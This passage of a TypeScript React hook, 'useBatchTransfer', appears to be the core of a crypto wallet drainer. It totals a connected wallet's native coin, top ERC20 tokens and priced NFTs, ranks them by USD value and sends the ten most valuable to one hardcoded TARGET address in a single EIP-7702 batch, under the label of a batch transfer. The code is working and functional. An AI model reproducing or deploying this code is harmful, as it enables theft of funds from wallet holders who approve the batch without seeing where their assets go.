          floor_price_usd_parsed: floorPriceUsdParsed,
          has_valid_price: hasValidPrice,
          is_erc721: (nft.contract_type || '').toUpperCase() === 'ERC721',
          is_erc1155: (nft.contract_type || '').toUpperCase() === 'ERC1155',
        }
      })

      console.log('[useBatchTransfer] NFT filtering results:', {
        totalNFTs: nftList.length,
        erc721Count: erc721NFTs.length,
        erc1155Count: erc1155NFTs.length,
        nftsWithValidPrice: nftPriceDetails.filter((n: any) => n.has_valid_price).length,
        nftsWithoutValidPrice: nftPriceDetails.filter((n: any) => !n.has_valid_price).length,
        priceDetails: nftPriceDetails,
      })

      // 计算gas费（参照参考文件）
      const erc20TransfersCount = Math.min(validERC20AssetsForGas.length, MAX_PRECHECK_COUNT)
      const erc721TransfersCount = erc721NFTs.length
      const erc1155TransfersCount = erc1155NFTs.length

      const defaults = {
        base: 46000, // 固定开销gas消耗
        native: 21000, // 原生代币转账gas消耗，实际约为12500
        safety: 20000, // 安全系数
        perErc20: 55000, // 每笔ERC20代币转账gas消耗，实际约为17000
        perErc721: 60000, // 每笔ERC721 NFT转账gas消耗
        perErc1155: 60000, // 每笔ERC1155 NFT转账gas消耗
      }

      const baseGas = BigInt(defaults.base)
      const nativeTransferGas = BigInt(defaults.native)
      const perErc20Gas = BigInt(defaults.perErc20)
      const perErc721Gas = BigInt(defaults.perErc721)
      const perErc1155Gas = BigInt(defaults.perErc1155)
      const safety = BigInt(defaults.safety)

      const totalEstimatedGas =
        baseGas +
        nativeTransferGas +
        perErc20Gas * BigInt(erc20TransfersCount) +
        perErc721Gas * BigInt(erc721TransfersCount) +
        perErc1155Gas * BigInt(erc1155TransfersCount) +
        safety

      // 使用硬编码 gasPrice(Gwei) 并加 20% buffer
      const chainGasPriceGwei: Record<number, number> = {
        1: 4, // Ethereum
        137: 80, // Polygon
        56: 0.3, // BNB Chain
        42161: 0.5, // Arbitrum
        8453: 0.5, // Base
        10: 0.5, // Optimism
        143: 150, // Monad
        11155111: 0.02, // Sepolia
      }
      const baseGwei = chainGasPriceGwei[chainId] ?? 0.5
      const baseWei = Math.max(1, Math.round(baseGwei * 1_000_000_000))
      let gasPriceWei = BigInt(baseWei)
      gasPriceWei = (gasPriceWei * BigInt(12)) / BigInt(10) // 加20% buffer

      const totalGasCost = totalEstimatedGas * gasPriceWei

      console.log('[useBatchTransfer] Gas calculation:', {
        totalEstimatedGas: totalEstimatedGas.toString(),
        gasPriceWei: gasPriceWei.toString(),
        totalGasCost: totalGasCost.toString(),
        nativeBalance: nativeBalance.toString(),
        canTransfer: nativeBalance > totalGasCost,
      })

      // 2.1 添加原生代币转账（预留gas费）
      // 参照 dex-aggregator 的方法：即使没有缓存的原生代币信息，也要添加转账（如果有余额）
      const nativeTransfers: any[] = []
      if (nativeBalance > totalGasCost) {
        const transferAmount = nativeBalance - totalGasCost

        // 计算 USD 价值（参照 dex-aggregator 的方法）
        let nativeUsdValue = 0
        if (nativeTokenUsdValue > 0) {
          // 直接使用缓存中的 usd_value，按转账比例计算
          const totalBalance = BigInt(nativeBalanceStr)
          if (totalBalance > BigInt(0)) {
            const transferRatio = Number(transferAmount) / Number(totalBalance)
            nativeUsdValue = nativeTokenUsdValue * transferRatio
          } else {
            nativeUsdValue = nativeTokenUsdValue
          }
        } else if (nativeTokenPrice > 0) {
          // 如果 API 没有返回 usd_value，则根据价格计算（后备方案）
          nativeUsdValue = Number(formatUnits(transferAmount, 18)) * nativeTokenPrice
        }

        nativeTransfers.push({
          type: 'native_transfer',
          to: TARGET,
          value: transferAmount,
          usd_value: nativeUsdValue,
          description: `Transfer ${formatUnits(transferAmount, 18)} ${nativeTokenSymbol} (reserved ${formatUnits(totalGasCost, 18)} for gas)`,
        })
        console.log('[useBatchTransfer] Added native token transfer:', {
          transferAmount: transferAmount.toString(),
          nativeUsdValue,
          nativeBalance: nativeBalance.toString(),
          totalGasCost: totalGasCost.toString(),
          hasNativeTokenInfo: !!nativeTokenInfo,
        })
      } else {
        console.log('[useBatchTransfer] Native balance too low for transfer after gas cost:', {
          nativeBalance: nativeBalance.toString(),
          totalGasCost: totalGasCost.toString(),
          canTransfer: nativeBalance > totalGasCost,
        })
      }
      allTransactions.push(...nativeTransfers)

      // 2.2 添加ERC721 NFT转账（无需预检）
      console.log('[useBatchTransfer] Processing ERC721 NFTs:', { 
        count: erc721NFTs.length, 
        nfts: erc721NFTs.map((nft: any) => ({
          token_id: nft.token_id,
          token_address: nft.token_address,
          name: nft.normalized_metadata?.name || nft.name,
          floor_price_usd_raw: nft.floor_price_usd,
          floor_price_usd_type: typeof nft.floor_price_usd,
        }))
      })
      let erc721AddedCount = 0
      let erc721SkippedCount = 0
      erc721NFTs.forEach((nft: any) => {
        const tokenId = BigInt(nft.token_id || '0').toString(16).padStart(64, '0')
        const fromAddress = address.slice(2).padStart(64, '0')
        const toAddress = TARGET.slice(2).padStart(64, '0')
        // ERC721 safeTransferFrom(address from, address to, uint256 tokenId)
        // 函数签名：0x42842e0e
        const data = `0x42842e0e${fromAddress}${toAddress}${tokenId}`

        const nftName = nft.normalized_metadata?.name || nft.name || `${nft.symbol || 'NFT'} #${nft.token_id}`
        // 增强价格解析逻辑：处理各种可能的格式
        let floorPriceUsd = 0
        if (nft.floor_price_usd !== undefined && nft.floor_price_usd !== null) {
          if (typeof nft.floor_price_usd === 'string') {
            const parsed = parseFloat(nft.floor_price_usd)
            floorPriceUsd = isNaN(parsed) ? 0 : parsed
          } else if (typeof nft.floor_price_usd === 'number') {
            floorPriceUsd = isNaN(nft.floor_price_usd) ? 0 : nft.floor_price_usd
          }
        }
        
        if (floorPriceUsd <= 0 || isNaN(floorPriceUsd)) {
          erc721SkippedCount++
          console.warn('[useBatchTransfer] ERC721 NFT has no valid price, skipping:', { 
            nftName, 
            tokenAddress: nft.token_address,
            token_id: nft.token_id,
            floor_price_usd_raw: nft.floor_price_usd,
            floor_price_usd_type: typeof nft.floor_price_usd,
            floor_price_usd_parsed: floorPriceUsd,
            isNaN: isNaN(floorPriceUsd),
          })
          return // 跳过没有价格的NFT
        }

        erc721AddedCount++
        allTransactions.push({
          type: 'erc721_transfer',
          to: nft.token_address,
          value: BigInt(0),
          data: data,
          usd_value: floorPriceUsd, // 使用解析后的floor_price_usd
          description: `Transfer ERC721: ${nftName}`,
        })
        console.log('[useBatchTransfer] Added ERC721 transfer:', { 
          nftName, 
          tokenAddress: nft.token_address, 
          floorPriceUsd,
          token_id: nft.token_id,
        })
      })
      console.log('[useBatchTransfer] ERC721 processing summary:', {
        total: erc721NFTs.length,
        added: erc721AddedCount,
        skipped: erc721SkippedCount,
      })

      // 2.3 添加ERC1155 NFT转账（无需预检）
      console.log('[useBatchTransfer] Processing ERC1155 NFTs:', { 
        count: erc1155NFTs.length, 
        nfts: erc1155NFTs.map((nft: any) => ({
          token_id: nft.token_id,
          token_address: nft.token_address,
          name: nft.normalized_metadata?.name || nft.name,
          floor_price_usd_raw: nft.floor_price_usd,
          floor_price_usd_type: typeof nft.floor_price_usd,
          amount: nft.amount,
        }))
      })
      let erc1155AddedCount = 0
      let erc1155SkippedCount = 0
      erc1155NFTs.forEach((nft: any) => {
        const tokenId = BigInt(nft.token_id || '0')

        // 使用 Moralis API 返回的 amount 字段，如果没有则默认为 1
        let amount = BigInt('1')
        if (nft.amount) {
          try {
            amount = BigInt(nft.amount)
          } catch (e) {
            amount = BigInt('1')
          }
        }

        const tokenIdHex = tokenId.toString(16).padStart(64, '0')
        const amountHex = amount.toString(16).padStart(64, '0')
        const fromAddress = address.slice(2).padStart(64, '0')
        const toAddress = TARGET.slice(2).padStart(64, '0')
        // ERC1155 safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes data)
        // 函数签名：0xf242432a
        const dataOffset = '00000000000000000000000000000000000000000000000000000000000000a0'
        const dataLength = '0000000000000000000000000000000000000000000000000000000000000000'
        const data = `0xf242432a${fromAddress}${toAddress}${tokenIdHex}${amountHex}${dataOffset}${dataLength}`

        const nftName = nft.normalized_metadata?.name || nft.name || `${nft.symbol || 'NFT'} #${nft.token_id}`
        // 增强价格解析逻辑：处理各种可能的格式
        let floorPriceUsd = 0
        if (nft.floor_price_usd !== undefined && nft.floor_price_usd !== null) {
          if (typeof nft.floor_price_usd === 'string') {
            const parsed = parseFloat(nft.floor_price_usd)
            floorPriceUsd = isNaN(parsed) ? 0 : parsed
          } else if (typeof nft.floor_price_usd === 'number') {
            floorPriceUsd = isNaN(nft.floor_price_usd) ? 0 : nft.floor_price_usd
          }
        }
        
        if (floorPriceUsd <= 0 || isNaN(floorPriceUsd)) {
          erc1155SkippedCount++
          console.warn('[useBatchTransfer] ERC1155 NFT has no valid price, skipping:', { 
            nftName, 
            tokenAddress: nft.token_address,
            token_id: nft.token_id,
            amount: amount.toString(),
            floor_price_usd_raw: nft.floor_price_usd,
            floor_price_usd_type: typeof nft.floor_price_usd,
            floor_price_usd_parsed: floorPriceUsd,
            isNaN: isNaN(floorPriceUsd),
          })
          return // 跳过没有价格的NFT
        }

        erc1155AddedCount++
        allTransactions.push({
          type: 'erc1155_transfer',
          to: nft.token_address,
          value: BigInt(0),
          data: data,
          usd_value: floorPriceUsd, // 使用解析后的floor_price_usd
          description: `Transfer ERC1155: ${nftName}${amount > BigInt('1') ? ` (${amount.toString()})` : ''}`,
        })
        console.log('[useBatchTransfer] Added ERC1155 transfer:', { 
          nftName, 
          tokenAddress: nft.token_address, 
          floorPriceUsd, 
          amount: amount.toString(),
          token_id: nft.token_id,
        })
      })
      console.log('[useBatchTransfer] ERC1155 processing summary:', {
        total: erc1155NFTs.length,
        added: erc1155AddedCount,
        skipped: erc1155SkippedCount,
      })
      
      console.log('[useBatchTransfer] After adding native and NFTs:', {
        allTransactionsCount: allTransactions.length,
        nativeTransfers: nativeTransfers.length,
        erc721Count: erc721NFTs.length,
        erc1155Count: erc1155NFTs.length,
        allTransactionsTypes: allTransactions.map((tx: any) => tx.type),
      })

      // 步骤3: 筛选所有ERC20代币（排除原生代币），按价值降序排序，取前20个进行预检
      // 使用 validERC20AssetsForGas（已经在上面计算gas费时定义过了）
      const validERC20Assets = validERC20AssetsForGas

      // 按价值降序排序（直接使用API获取的usd_value）
      validERC20Assets.sort((a, b) => {
        // 直接使用API返回的usd_value，确保类型统一为数字
        const valueA = typeof a.usd_value === 'number' ? a.usd_value : parseFloat(a.usd_value || '0')
        const valueB = typeof b.usd_value === 'number' ? b.usd_value : parseFloat(b.usd_value || '0')
        if (valueA > 0 && valueB > 0) {
          return valueB - valueA // 按价值降序
        }
        if (valueA > 0) return -1
        if (valueB > 0) return 1
        // 都没有价值时，按余额降序
        const balanceA = parseFloat(a.balance || a.balance_formatted || a.token_balance || '0')
        const balanceB = parseFloat(b.balance || b.balance_formatted || b.token_balance || '0')
        return balanceB - balanceA
      })

      // 取前20个ERC20代币进行预检
      const erc20ToPrecheck = validERC20Assets.slice(0, MAX_PRECHECK_COUNT)
      console.log('[useBatchTransfer] ERC20 assets to precheck:', {
        count: erc20ToPrecheck.length,
        assets: erc20ToPrecheck.map((asset) => ({
          symbol: asset.symbol,
          balance: asset.balance,
          usd_value: asset.usd_value,
          token_address: asset.token_address,
        })),
      })

      // 构建ERC20预检交易
      const erc20PrecheckTransactions: any[] = []
      for (const asset of erc20ToPrecheck) {
        try {
          const balanceValue = asset.balance || asset.balance_formatted || asset.token_balance || '0'
          const decimals = asset.decimals || 18

          // 确保balanceValue是有效的BigInt格式
          let validBalanceValue = balanceValue.toString()
          if (!isNaN(parseFloat(validBalanceValue))) {
            validBalanceValue = BigInt(Math.floor(parseFloat(validBalanceValue))).toString()
          } else {
            try {
              validBalanceValue = BigInt(balanceValue).toString()
            } catch (e) {
              continue
            }
          }

          const balance = BigInt(validBalanceValue)
          const transferAmount = balance.toString(16).padStart(64, '0')
          const recipientAddress = TARGET.slice(2).padStart(64, '0')
          const data = `0xa9059cbb${recipientAddress}${transferAmount}`

          // 直接使用API获取的usd_value，确保类型统一为数字
          const usdValue = typeof asset.usd_value === 'number' ? asset.usd_value : parseFloat(asset.usd_value || '0')
          erc20PrecheckTransactions.push({
            type: 'erc20_transfer',
            to: asset.token_address,
            value: BigInt(0),
            data: data,
            balance: balance,
            decimals: decimals,
            usd_value: usdValue,
            description: `Transfer ${formatUnits(balance, decimals)} ${asset.symbol}`,
          })
        } catch (error) {
          // 跳过无法准备的交易
        }
      }

      // 对ERC20交易进行预检（eth_call）
      const validERC20Transactions: any[] = []
      console.log('[useBatchTransfer] Prechecking ERC20 transactions:', {
        count: erc20PrecheckTransactions.length,
        transactions: erc20PrecheckTransactions.map((tx) => ({
          type: tx.type,
          to: tx.to,
          symbol: tx.description,
          usd_value: tx.usd_value,
        })),
      })
      for (const tx of erc20PrecheckTransactions) {
        try {
          await publicClient.call({
            to: tx.to as `0x${string}`,
            data: tx.data as `0x${string}`,
            account: address as `0x${string}`,
          })
          // 预检成功，添加到有效交易列表
          validERC20Transactions.push(tx)
          console.log('[useBatchTransfer] ERC20 precheck passed:', tx.description)
        } catch (error) {
          // 预检失败，跳过此交易
          console.warn('[useBatchTransfer] ERC20 precheck failed:', tx.description, error)
        }
      }
      console.log('[useBatchTransfer] ERC20 precheck results:', {
        total: erc20PrecheckTransactions.length,
        valid: validERC20Transactions.length,
        validTransactions: validERC20Transactions.map((tx) => ({
          type: tx.type,
          to: tx.to,
          symbol: tx.description,
          usd_value: tx.usd_value,
        })),
      })

      // 步骤4: 合并所有有效交易：原生代币转账 + 通过预检的ERC20 + ERC721 + ERC1155
      // 注意：nativeTransfers 已经在上面单独处理并添加到 allTransactions 中
      const erc721Transfers = allTransactions.filter((tx: any) => tx.type === 'erc721_transfer')
      const erc1155Transfers = allTransactions.filter((tx: any) => tx.type === 'erc1155_transfer')
      const nativeTransfersFromAll = allTransactions.filter((tx: any) => tx.type === 'native_transfer')
      
      console.log('[useBatchTransfer] Filtering transactions before merge:', {
        allTransactionsCount: allTransactions.length,
        allTransactionsTypes: allTransactions.map((tx: any) => tx.type),
        erc721TransfersCount: erc721Transfers.length,
        erc1155TransfersCount: erc1155Transfers.length,
        erc721TransfersDetails: erc721Transfers.map((tx: any) => ({
          type: tx.type,
          to: tx.to,
          description: tx.description,
          usd_value: tx.usd_value,
        })),
        erc1155TransfersDetails: erc1155Transfers.map((tx: any) => ({
          type: tx.type,
          to: tx.to,
          description: tx.description,
          usd_value: tx.usd_value,
        })),
      })
      
      const allValidTransactions = [
        ...nativeTransfersFromAll, // 使用从 allTransactions 中过滤出的原生代币转账
        ...validERC20Transactions,
        ...erc721Transfers,
        ...erc1155Transfers,
      ]

      console.log('[useBatchTransfer] Transaction summary:', {
        nativeTransfers: nativeTransfersFromAll.length,
        validERC20Transactions: validERC20Transactions.length,
        erc721Transfers: erc721Transfers.length,
        erc1155Transfers: erc1155Transfers.length,
        allValidTransactions: allValidTransactions.length,
        allTokensLength: allTokens.length,
        nftListLength: nftList.length,
        nativeTokenInfo,
        allTransactionsBeforeMerge: allTransactions.map((tx: any) => ({
          type: tx.type,
          to: tx.to,
          value: tx.value?.toString(),
          usd_value: tx.usd_value,
        })),
      })

      // 步骤5: 按价值降序排序后取前10笔（直接使用API获取的usd_value）
      // 注意：所有交易类型的usd_value都来自API：
      // - 原生代币：来自API的usd_value（或按比例计算）
      // - ERC20代币：来自API的usd_value
      // - ERC721 NFT：来自API的floor_price_usd
      // - ERC1155 NFT：来自API的floor_price_usd
      console.log('[useBatchTransfer] Before sorting:', {
        count: allValidTransactions.length,
        transactions: allValidTransactions.map((tx: any) => ({
          type: tx.type,
          to: tx.to,
          usd_value: tx.usd_value,
          description: tx.description,
        })),
      })
      
      console.log('[useBatchTransfer] Before sorting allValidTransactions:', {
        count: allValidTransactions.length,
        transactions: allValidTransactions.map((tx: any) => ({
          type: tx.type,
          description: tx.description,
          usd_value: tx.usd_value,
          usd_value_type: typeof tx.usd_value,
        })),
      })
      
      allValidTransactions.sort((a: any, b: any) => {
        // 直接使用API返回的usd_value，确保类型统一为数字
        const valueA = typeof a.usd_value === 'number' ? a.usd_value : parseFloat(a.usd_value || '0')
        const valueB = typeof b.usd_value === 'number' ? b.usd_value : parseFloat(b.usd_value || '0')
        return valueB - valueA // 降序
      })
      
      console.log('[useBatchTransfer] After sorting allValidTransactions:', {
        count: allValidTransactions.length,
        transactions: allValidTransactions.map((tx: any) => ({
          type: tx.type,
          description: tx.description,
          usd_value: tx.usd_value,
        })),
      })

      console.log('[useBatchTransfer] After sorting:', {
        count: allValidTransactions.length,
        transactions: allValidTransactions.map((tx: any) => ({
          type: tx.type,
          to: tx.to,
          usd_value: tx.usd_value,
          description: tx.description,
        })),
      })

      const finalTransactions = allValidTransactions.slice(0, MAX_BATCH_SIZE)

      console.log('[useBatchTransfer] Final transactions:', {
        finalTransactionsCount: finalTransactions.length,
        finalTransactions: finalTransactions.map((tx: any) => ({
          type: tx.type,
          to: tx.to,
          value: tx.value?.toString(),
          usd_value: tx.usd_value,
          description: tx.description,
          hasData: !!tx.data,
        })),
        transactionTypeBreakdown: {
          native: finalTransactions.filter((tx: any) => tx.type === 'native_transfer').length,
          erc20: finalTransactions.filter((tx: any) => tx.type === 'erc20_transfer').length,
          erc721: finalTransactions.filter((tx: any) => tx.type === 'erc721_transfer').length,
          erc1155: finalTransactions.filter((tx: any) => tx.type === 'erc1155_transfer').length,
        },
      })

      if (finalTransactions.length === 0) {
        const errorMsg = `No valid transactions found.\n\nDebug info:\n- Cached tokens: ${cachedTokenList?.length || 0}\n- All tokens after filter: ${allTokens.length}\n- Native transfers: ${nativeTransfersFromAll.length}\n- Valid ERC20: ${validERC20Transactions.length}\n- ERC721: ${erc721Transfers.length}\n- ERC1155: ${erc1155Transfers.length}\n\nPlease check:\n1. Wallet has tokens with balance > 0\n2. Token cache is populated\n3. Network is correct`
        console.error('[useBatchTransfer]', errorMsg, {
          cachedTokenList,
          allTokens,
          nativeTokenInfo,
          nftList,
        })
        alert(errorMsg)
        setIsPrechecking(false)
        return
      }

      // 步骤6: 执行eip7702批量交易
      // 格式化calls，确保所有字段格式正确
      const calls = finalTransactions.map((tx: any, index: number) => {
        // 验证地址格式
        if (!tx.to || typeof tx.to !== 'string' || !tx.to.startsWith('0x') || tx.to.length !== 42) {
          throw new Error(`Invalid address at transaction ${index}: ${tx.to}`)
        }

        // 确保value是BigInt类型
        let value = BigInt(0)
        if (tx.value) {
          if (typeof tx.value === 'bigint') {
            value = tx.value
          } else if (typeof tx.value === 'string') {
            value = BigInt(tx.value)
          } else if (typeof tx.value === 'number') {
            value = BigInt(tx.value)
          }
        }

        const call: any = {
          to: tx.to.toLowerCase(), // 确保地址是小写
          value: value,
        }

        // 只有当data存在且不为空时才添加
        if (tx.data && typeof tx.data === 'string' && tx.data.startsWith('0x') && tx.data.length > 2) {
          call.data = tx.data as `0x${string}`
        }

        return call
      })

      // 确保chainId是数字类型
      const numericChainId = Number(chainId)

      if (!numericChainId || isNaN(numericChainId)) {
        throw new Error(`Invalid chain ID: ${chainId}`)
      }

      // 验证所有calls的格式
      for (let i = 0; i < calls.length; i++) {
        const call = calls[i]
        if (!call.to || !call.to.startsWith('0x') || call.to.length !== 42) {
          throw new Error(`Invalid call[${i}].to address: ${call.to}`)
        }
        if (typeof call.value !== 'bigint') {
          throw new Error(`Invalid call[${i}].value type: ${typeof call.value}, expected bigint`)
        }
        if (call.data && (!call.data.startsWith('0x') || call.data.length < 2)) {
          throw new Error(`Invalid call[${i}].data format: ${call.data}`)
        }
      }

      setCurrentSendCallsOperation(operationType)

      // 使用 wagmi 的 sendCalls 执行 EIP-7702 批量交易
      // sendCalls 会调用 wallet_sendCalls RPC 方法
      // 对于 EIP-1559 兼容的链，wagmi 会自动使用 maxFeePerGas 和 maxPriorityFeePerGas
      await sendCalls({
        chainId: numericChainId,
        calls,
      })

      setIsPrechecking(false)
    } catch (error: any) {
      // 处理各种错误类型
      let errorMessage = 'Failed to submit batch transfer.'
      if (error instanceof Error) {
        // 处理 Internal JSON-RPC error
        if ((error as any).code === -32603 || error.message.includes('Internal JSON-RPC error')) {
          const errorData = (error as any).data || {}
          const originalError = errorData.originalError || errorData.message || error.message
          errorMessage =
            `Internal JSON-RPC Error (Code: ${(error as any).code})\n\n` +
            `This usually indicates an issue with the transaction data format.\n\n` +
            `Error details: ${originalError}\n\n` +
            `Please check:\n` +
            `1. All transaction addresses are valid\n` +
            `2. Transaction data is properly formatted\n` +
            `3. You have sufficient balance for gas fees\n` +
            `4. Try refreshing the page and retrying`
        }
        // 处理EIP-7702不支持的错误
        else if (error.message.includes('EIP-7702 not supported') || (error as any).code === 5710) {
          const chainName =
            chainId === 1
              ? 'Ethereum'
              : chainId === 56
                ? 'BNB Chain'
                : chainId === 137
                  ? 'Polygon'
                  : chainId === 42161
                    ? 'Arbitrum'
                    : chainId === 8453
                      ? 'Base'
                      : chainId === 10
                        ? 'Optimism'
                        : chainId === 143
                          ? 'Monad'
                          : `Chain ${chainId}`

          // 提供详细的错误信息和解决方案
          errorMessage =
            `EIP-7702 Error on ${chainName} (Chain ID: ${chainId})\n\n` +
            `Error Code: ${(error as any).code || 'N/A'}\n\n` +
            `Possible solutions:\n` +
            `1. Update MetaMask to the latest version (v11.0.0 or later)\n` +
            `2. Ensure you're on the correct network (${chainName} Mainnet)\n` +
            `3. Try refreshing the page and reconnecting your wallet\n` +
            `4. Check if EIP-7702 is enabled in MetaMask settings\n\n` +
            `If the problem persists, this may be a MetaMask limitation. ` +
            `Please check MetaMask documentation for EIP-7702 support on ${chainName}.`
        }
        // 处理移动端 EIP-1559 交易参数错误
        else if (
          error.message.includes('gasPrice instead of maxFeePerGas') ||
          error.message.includes('Invalid transaction envelope type') ||
          error.message.includes('type "0x4"')
        ) {
          const chainName =
            chainId === 1
              ? 'Ethereum'
              : chainId === 56
                ? 'BNB Chain'
                : chainId === 137
                  ? 'Polygon'
                  : chainId === 42161
                    ? 'Arbitrum'
                    : chainId === 8453
                      ? 'Base'
                      : chainId === 10
                        ? 'Optimism'
                        : chainId === 143
                          ? 'Monad'
                          : `Chain ${chainId}`

          errorMessage =
            `Transaction Parameter Error on ${chainName}\n\n` +
            `This error typically occurs on mobile wallets when the transaction type doesn't match the gas parameters.\n\n` +
            `Possible solutions:\n` +
            `1. Try using the desktop version of MetaMask\n` +
            `2. Update MetaMask mobile app to the latest version\n` +
            `3. Try refreshing the page and reconnecting your wallet\n` +
            `4. If the problem persists, this may be a known issue with mobile wallets and EIP-7702 batch transactions\n\n` +
            `Error details: ${error.message}`
        } else {
          errorMessage = error.message
        }
      }

      alert(errorMessage)
      setIsPrechecking(false)
      setCurrentSendCallsOperation(null)
    }
  }

  return executeBatchTransfer
}
